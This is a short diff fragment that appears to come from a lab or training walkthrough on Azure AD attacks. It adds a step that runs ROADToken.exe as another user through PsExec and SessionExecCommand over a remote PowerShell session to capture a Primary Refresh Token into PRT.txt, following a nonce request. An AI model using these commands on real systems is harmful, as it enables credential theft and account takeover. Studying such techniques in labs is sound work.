@@ -1293,3 +1293,6 @@ $Body = @{ "grant_type" = "srv_challenge" }
 $Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
 $Result.Nonce
 ```
+
+Finally, run ROADToken.exe in the context of MichaelMBarron using SessionExecCommand.exe with the help of PsExec64.exe. Ignore the errors after running the below command and note that we are redirecting the output to PRT.txt: 
+```Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student213\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\Public\student213\SessionExecCommand.exe MichaelMBarron C:\Users\Public\student213\ROADToken.exe <nonce> > C:\Users\Public\student213\PRT.txt"}
